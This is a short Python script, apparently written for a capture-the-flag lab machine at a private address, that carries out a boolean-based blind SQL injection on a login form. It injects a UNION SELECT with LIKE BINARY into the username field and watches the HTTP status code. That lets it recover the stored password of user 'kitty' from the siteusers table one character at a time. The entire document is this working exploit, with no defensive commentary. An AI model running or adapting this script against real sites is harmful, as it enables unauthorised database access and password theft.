import requests
import string

main_ip = 'http://10.10.92.42/index.php'

def exploit():
    character = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-/:_$#"=!*^ '
    cadena = ""
    while True:                
        for letra in character:
            payload = {
                'username':f"kitty' UNION SELECT 1, password, 3, 4 FROM mywebsite.siteusers WHERE username = 'kitty' AND password LIKE BINARY '{cadena}{letra}%' -- -",
                'password':'ol'
            }
            solicitud = requests.post(main_ip,data=payload,allow_redirects=False)                
            status = solicitud.status_code
            if status == 200:
                cadena += letra  
                print(cadena)
                          
                break
            elif letra == " ":
                print(f'La columna es: {cadena}')
                break
            
if __name__ == '__main__':
    exploit()